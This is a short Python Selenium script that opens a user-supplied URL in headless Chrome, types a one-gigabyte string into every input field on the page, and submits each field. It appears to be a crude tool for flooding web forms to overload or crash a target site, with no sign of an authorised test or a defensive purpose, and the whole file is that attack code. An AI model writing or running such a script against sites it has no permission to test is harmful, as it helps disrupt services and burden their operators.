import os
from time import sleep

from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from webdriver_manager.chrome import ChromeDriverManager
from selenium import webdriver

url = str(input("Enter the URL: "))
options = webdriver.ChromeOptions()
options.add_argument("--headless")

driver = webdriver.Chrome(ChromeDriverManager().install(), options=options)
driver.get(url)

inputs = driver.find_elements(By.TAG_NAME, "input")
for input in inputs:
    input.send_keys("a" * 1024 * 1024 * 1024)
    sleep(1)
for input in inputs:
    input.send_keys(Keys.ENTER)
    sleep(1)

print("sent!")
